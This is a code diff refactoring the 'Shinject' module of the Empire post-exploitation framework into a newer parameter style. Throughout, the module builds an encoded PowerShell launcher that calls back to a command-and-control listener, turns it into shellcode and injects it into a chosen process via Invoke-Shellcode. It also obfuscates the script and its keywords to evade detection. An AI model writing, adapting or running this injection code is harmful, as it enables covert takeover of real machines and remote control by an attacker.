@@ -2,165 +2,69 @@ from __future__ import print_function
 
 from builtins import object
 from builtins import str
+from typing import Dict
 
 from empire.server.common import helpers
+from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False,
+                 obfuscation_command: str = ""):
+        listener_name = params['Listener']
+        proc_id = params['ProcId'].strip()
+        user_agent = params['UserAgent']
+        proxy = params['Proxy']
+        proxy_creds = params['ProxyCreds']
+        arch = params['Arch']
 
-    def __init__(self, mainMenu, params=[]):
-
-        # Metadata info about the module, not modified during runtime
-        self.info = {
-            # Name for the module that will appear in module menus
-            'Name': 'Shinject',
-
-            # List of one or more authors for the module
-            'Author': ['@xorrior','@mattefistation','@monogas'],
-
-            # More verbose multi-line description of the module
-            'Description': ('Injects a PIC shellcode payload into a target process, via Invoke-Shellcode'),
-
-            'Software': '',
-
-            'Techniques': ['T1055'],
-
-            # True if the module needs to run in the background
-            'Background': True,
-
-            # File extension to save the file as
-            'OutputExtension': None,
-
-            # True if the module needs admin rights to run
-            'NeedsAdmin': False,
-
-            # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe': True,
-
-            # The language for this module
-            'Language': 'powershell',
-
-            # The minimum PowerShell version needed for the module to run
-            'MinLanguageVersion': '2',
-
-            # List of any references/other comments
-            'Comments': [
-                'comment',
-                ''
-            ]
-        }
-
-        # Any options needed by the module, settable during runtime
-        self.options = {
-            # Format:
-            #   value_name : {description, required, default_value}
-            'Agent': {
-                # The 'Agent' option is the only one that MUST be in a module
-                'Description':   'Agent to run the module on.',
-                'Required'   :   True,
-                'Value'      :   ''
-            },
-            'ProcId' : {
-                'Description'   :   'ProcessID to inject into.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Arch' : {
-                'Description'   :   'Architecture of the target process.',
-                'Required'      :   True,
-                'Value'         :  ''
-            },
-            'Listener' : {
-                'Description'   :   'Listener to use.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'UserAgent' : {
-                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            },
-            'Proxy' : {
-                'Description'   :   'Proxy to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            },
-            'ProxyCreds' : {
-                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            }
-        }
-
-        # Save off a copy of the mainMenu object to access external
-        #   functionality like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-
-        # During instantiation, any settable option parameters are passed as
-        #   an object set to the module and the options dictionary is
-        #   automatically set. This is mostly in case options are passed on
-        #   the command line.
-        if params:
-            for param in params:
-                # Parameter format is [Name, Value]
-                option, value = param
-                if option in self.options:
-                    self.options[option]['Value'] = value
-
-
-    def generate(self, obfuscate=False, obfuscationCommand=""):
-
-        listenerName = self.options['Listener']['Value']
-        procID = self.options['ProcId']['Value'].strip()
-        userAgent = self.options['UserAgent']['Value']
-        proxy = self.options['Proxy']['Value']
-        proxyCreds = self.options['ProxyCreds']['Value']
-        arch = self.options['Arch']['Value']
-
-        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-Shellcode.ps1"
+        module_source = main_menu.installPath + "/data/module_source/code_execution/Invoke-Shellcode.ps1"
         if obfuscate:
-            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
-            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
+            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
+            module_source = module_source.replace("module_source", "obfuscated_module_source")
         try:
-            f = open(moduleSource, 'r')
+            f = open(module_source, 'r')
         except:
-            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
+            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
             return ""
 
-        moduleCode = f.read()
+        module_code = f.read()
         f.close()
-        
+
         # If you'd just like to import a subset of the functions from the
         #   module source, use the following:
         #   script = helpers.generate_dynamic_powershell_script(moduleCode, ["Get-Something", "Set-Something"])
-        script = moduleCode
-        scriptEnd = "; shellcode injected into pid {}".format(str(procID))
-        
-        if not self.mainMenu.listeners.is_listener_valid(listenerName):
+        script = module_code
+        script_end = "; shellcode injected into pid {}".format(str(proc_id))
+
+        if not main_menu.listeners.is_listener_valid(listener_name):
             # not a valid listener, return nothing for the script
-            print(helpers.color("[!] Invalid listener: {}".format(listenerName)))
+            print(helpers.color("[!] Invalid listener: {}".format(listener_name)))
             return ''
         else:
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
-            
+            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
+                                                           userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds)
+
             if launcher == '':
                 print(helpers.color('[!] Error in launcher generation.'))
                 return ''
             else:
-                launcherCode = launcher.split(' ')[-1]
+                launcher_code = launcher.split(' ')[-1]
 
-                sc = self.mainMenu.stagers.generate_shellcode(launcherCode, arch)
+                sc = main_menu.stagers.generate_shellcode(launcher_code, arch)
 
                 encoded_sc = helpers.encode_base64(sc)
 
         # Add any arguments to the end execution of the script
-        
-        #t = iter(sc)
-        #pow_array = ',0x'.join(a+b for a,b in zip(t, t))
-        #pow_array = "@(0x" + pow_array + " )"
-        script += "\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String(\"{}\")) -Force".format(procID, encoded_sc)
-        script += scriptEnd
+
+        # t = iter(sc)
+        # pow_array = ',0x'.join(a+b for a,b in zip(t, t))
+        # pow_array = "@(0x" + pow_array + " )"
+        script += "\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String(\"{}\")) -Force".format(
+            proc_id, encoded_sc)
+        script += script_end
         script = helpers.keyword_obfuscation(script)
 
         return script
